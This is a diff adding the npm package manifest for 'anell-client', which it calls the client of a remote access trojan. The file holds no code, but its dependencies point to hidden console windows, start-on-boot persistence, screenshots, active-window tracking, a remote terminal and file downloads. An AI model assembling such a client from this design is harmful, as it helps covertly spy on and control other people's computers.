@@ -1,0 +1,38 @@
+{
+  "name": "anell-client",
+  "version": "1.0.0",
+  "description": "The client for anell (rat)",
+  "main": "client.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/kosmixyt/anell.git"
+  },
+  "keywords": [
+    "anell"
+  ],
+  "author": "KOSMIX",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/kosmixyt/anell/issues"
+  },
+  "homepage": "https://github.com/kosmixyt/anell#readme",
+  "dependencies": {
+    "active-win": "^7.7.2",
+    "child_process": "^1.0.2",
+    "electron": "^18.2.0",
+    "node-downloader-helper": "^2.1.1",
+    "node-hide-console-window": "^2.1.1",
+    "node-pty": "^0.10.1",
+    "open": "^8.4.0",
+    "path": "^0.12.7",
+    "screenshot-desktop": "^1.12",
+    "socket.io-client": "^4.5.0",
+    "socket.io-stream": "^0.9.1",
+    "start-on-windows-boot": "^1.0.0",
+    "systeminformation": "^5.11.14"
+
+  }
+}
